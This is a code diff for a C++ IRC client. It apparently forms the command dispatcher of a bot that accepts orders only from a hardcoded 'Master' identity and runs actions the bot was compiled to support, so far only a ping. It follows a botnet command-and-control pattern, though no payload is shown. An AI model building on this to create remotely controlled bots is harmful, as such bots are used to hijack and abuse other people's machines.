@@ -2,7 +2,7 @@
 
 #include <sstream>
 #include <iostream>
-#include <cstring>
+#include <string>
 #include <csignal>
 
 IrcClient::IrcClient(const char* server, int port)
@@ -50,16 +50,32 @@ void IrcClient::signalHandler(int signal) {
     exit(signal);
 }
 
-std::string IrcClient::concatenateParams(const char* firstParam, const char** params, unsigned int count) {
-    std::ostringstream oss;
-    oss << firstParam << " ";
-    for (unsigned int i = 0; i < count; ++i) {
-        if (i > 0) {
-            oss << " ";
-        }
-        oss << params[i];
+std::string IrcClient::concatenateParams(const char* event, const char* origin, const char** params, unsigned int count) {
+    std::string result;
+    //printf("Event: %s\n", event);
+    //printf("Origin: %s\n", origin);
+    //printf("Params[0]: %s\n", params[0]);
+
+    if (strcmp(origin, "") != 0) {
+        result += origin;
+        result += " ";
     }
-    return oss.str();
+
+    if (strcmp(event, "") != 0) {
+        result += event;
+        result += " ";
+    }
+    
+    // Add each parameter
+    for (unsigned int i = 0; i < count; ++i) {
+        result += params[i];
+        result += " ";
+    }
+    
+    // Add the newline at the end
+    //result += "\n";
+    
+    return result;
 }
 
 bool IrcClient::isRegistered() {
@@ -95,46 +111,49 @@ void IrcClient::event_connect(irc_session_t* session, const char* event, const c
 }
 
 void IrcClient::event_unknown(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
+    printf("event unknown hit\n");
     IrcClient::parseEvent(session, event, origin, params, count);
 }
 
 void IrcClient::dump_event(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
-	IrcClient::parseEvent(session, event, origin, params, count);
+	printf("dump event hit\n");
+    IrcClient::parseEvent(session, event, origin, params, count);
 }
 void IrcClient::parseEvent(irc_session_t* session, const char* event, const char* origin, const char** params, unsigned int count) {
     IrcClient* instance = getInstance(session);
     if (!instance) {
         return;
     }
+    const char* tempEvent = event != nullptr && strcmp(event, "null") != 0 ? event : "";
+    const char* tempOrigin = origin != nullptr && strcmp(origin, "null") != 0 ? origin : "";
+    std::string receivedMessage = IrcClient::concatenateParams(tempEvent, tempOrigin, params, count);
 
-    std::string receivedMessage;
-    if (event != nullptr) {
-        receivedMessage = IrcClient::concatenateParams(event, params, count);
-    } else {
-        receivedMessage = IrcClient::concatenateParams("", params, count);
-    }
+    printf("Received message: %s\n", receivedMessage.c_str());
 
     if (strcmp(event, "(REGISTERED)") == 0) {
         instance->registrationStatus = true;
+        return;
     }
 
     if (!instance->isRegistered()) {
         return;
     }
     
-    ActionInfo actionInfo = MessageParser::parseMessage(event, params, count);
+    ActionInfo actionInfo = MessageParser::parseMessage(receivedMessage, "Master!masterUser@192.168.1.127");
+    instance->createAction(actionInfo);
+}
+
+
+void IrcClient::createAction(ActionInfo actionInfo) {
     // Create Action
     Action* action = nullptr;
-    // temp test
-    action = new PingAction(42, false, 42);
-    /*if (actionInfo.getActionType() == ActionType::PING) { // check if bot was compiled to support this
-        action = new PingAction(42, std::string("test"), false, 42);
-    }*/
+    if (actionInfo.getActionType() == ActionType::PING) { // check if bot was compiled to support this
+        action = new PingAction(actionInfo.getActionParams());
+    }
 
     if (action) {
         action->execute();
         delete action;
     }
-    //createAction(actionInfo);
 }
 
